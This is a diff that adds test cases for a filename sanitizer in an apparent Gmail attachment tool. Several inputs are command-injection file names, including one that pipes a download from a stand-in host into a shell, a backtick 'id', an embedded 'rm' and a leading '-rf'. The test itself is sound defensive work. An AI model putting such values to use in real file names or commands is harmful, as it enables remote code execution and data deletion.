@@ -30,6 +30,20 @@ from google_personal_mcp.gmail.attachments import (
         (".  ..", "fallback"),
         (" . .bashrc", "bashrc"),
         ("a\u202eb\u2028c\u2029d.txt", "abcd.txt"),
+        # Shell metacharacters become "_": the returned path is likely to end up in a shell command.
+        ("$(curl -s evil.example|sh).pdf", "_(curl -s evil.example_sh).pdf"),
+        ("`id`.pdf", "_id_.pdf"),
+        ('a"; rm x; ".pdf', "a__ rm x_ _.pdf"),
+        ("a<b>c&d'e.txt", "a_b_c_d_e.txt"),
+        ("*?[x]{y}!#%^:.txt", "___x__y______.txt"),
+        ("~root.txt", "_root.txt"),
+        # A leading "-" would read as a command option.
+        ("-rf", "_-rf"),
+        ("--help.pdf", "_--help.pdf"),
+        # Ordinary names, accents and other scripts are kept.
+        ("Informe a\u00f1o 2026 (1).pdf", "Informe a\u00f1o 2026 (1).pdf"),
+        ("a+b=c,d@e_f-g.txt", "a+b=c,d@e_f-g.txt"),
+        ("\u8acb\u6c42\u66f8 \u20ac.pdf", "\u8acb\u6c42\u66f8 \u20ac.pdf"),
     ],
 )
 def test_sanitize(raw, expected):
